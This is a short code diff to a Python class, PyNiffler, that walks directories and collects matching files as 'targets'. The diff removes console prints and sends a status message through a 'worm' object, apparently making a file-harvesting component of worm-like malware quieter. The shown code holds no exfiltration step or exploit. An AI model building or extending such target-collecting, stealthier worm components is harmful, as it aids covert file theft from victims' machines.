@@ -124,7 +124,7 @@ class PyNiffler:
     
     def resetNiffler(self) -> None:
         if self.WORKING_FLAG_FIND:
-            print("ERROR: niffler is still working.")
+            self.worm.send_msg("ERROR: niffler is still working.")
         else:
             self.resetTargets()
             self.th_master_find = None
@@ -205,8 +205,6 @@ class PyNiffler:
                 if self.checkFile(mdir_path):
                     self.addTarget(mdir_path)
 
-
-
     def _startMainScan(self) -> None:
         for sp in self.TAR_start_path:
             if os.path.exists(sp):
@@ -217,15 +215,10 @@ class PyNiffler:
     def startMainScan(self) -> None:
         self._startMainScan()
         while self.WORKING_FLAG_FIND:
-            print("Wait")
             sleep(0.5)
-        print("DONE")
-        print("FIND: ", len(self.Targets))
-
 
     def findTargets(self) -> None:
         self.resetNiffler()
-        print("Start find targets.....")
         self.startMainScan()
     
     def start(self) -> None:
